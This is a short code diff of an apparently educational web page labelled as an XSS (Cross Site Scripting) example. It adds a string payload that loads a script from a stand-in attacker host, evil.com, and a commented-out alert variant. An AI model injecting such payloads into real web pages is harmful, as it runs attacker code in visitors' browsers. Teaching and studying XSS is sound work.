@@ -7,9 +7,12 @@
     </head>
     <body>
 <script>
-var s = "kissa";
+var s = "cat";
 // example of XSS = Cross Site Scripting vulnerability
-var hacker = "<script src='evil.js'>x='evil code';<\/script>Pretending Good";
+
+var hacker = "<script src='http://evil.com/evil.js'><\/script>Pretending Good";
+//var hacker = "<script>alert('hacked!')<\/script>Pretending Good";
+
 
 String.prototype.lastCharacter = function() {
     return this.charAt(this.length-1);
